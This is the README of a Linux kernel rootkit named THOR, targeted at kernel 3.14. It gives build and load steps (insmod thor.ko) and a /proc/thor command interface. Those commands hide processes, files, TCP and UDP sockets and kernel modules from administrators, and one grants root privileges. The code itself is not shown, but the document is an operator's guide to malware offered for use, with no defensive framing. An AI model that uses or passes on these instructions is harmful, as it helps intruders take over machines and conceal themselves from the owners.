# THOR

The Horrific Omnipotent Rootkit - or something like that, targeted at kernel
3.14 (archlinux LTS at the time of writing).

## Requirements

Apart from the linux kernel headers, the linux source code is required in order
to build this rootkit since unexported code is used.

Just make sure `/usr/src/linux` points to the linux source directory of the
target kernel. Or you could simply change the `Makefile`.

## How to Setup (Arch)

    # pacman -S abs linux-headers
    # abs
    # cd /var/abs/core/linux
    # makepkg -o --asroot
    # ln -s /var/abs/core/linux/src/linux-3.17 /usr/src/linux

## How to Build

    $ cd /path/to/thor
    $ make
    # insmod thor.ko

## How to Use

    usage:
       echo hp PID    > /proc/thor     (hides process PID)
       echo up PID    > /proc/thor     (unhides process PID)
       echo upa       > /proc/thor     (unhide all PIDs)
       echo hf FILE   > /proc/thor     (hide file FILE)
       echo uf FILE   > /proc/thor     (unhide file FILE)
       echo ufa       > /proc/thor     (unhide all files)
       echo ht4s PORT > /proc/thor     (hide tcp4 socket)
       echo ut4s PORT > /proc/thor     (unhide tcp4 socket)
       echo ht6s PORT > /proc/thor     (hide tcp6 socket)
       echo ut6s PORT > /proc/thor     (unhide tcp6 socket)
       echo hu4s PORT > /proc/thor     (hide udp4 socket)
       echo uu4s PORT > /proc/thor     (unhide udp4 socket)
       echo hu6s PORT > /proc/thor     (hide udp6 socket)
       echo uu6s PORT > /proc/thor     (unhide udp6 socket)
       echo usa       > /proc/thor     (unhide all sockets)
       echo hm MODULE > /proc/thor     (hide module)
       echo um MODULE > /proc/thor     (unhide module)
       echo uma       > /proc/thor     (unhide all modules)
       echo root      > /proc/thor     (gain root privileges)

## Acknowledgement

- [Arkadiusz "ivyl" Hiler](https://github.com/ivyl/rootkit)
- [Michael "mncoppola" Coppola] (https://github.com/mncoppola/suterusu)
- [Morgan "mrrrgn" Phillips](https://github.com/mrrrgn/simple-rootkit)
- [XieRan](https://github.com/nareix/tls-example)
- [uzyszkodnik](https://github.com/uzyszkodnik/rootkit)
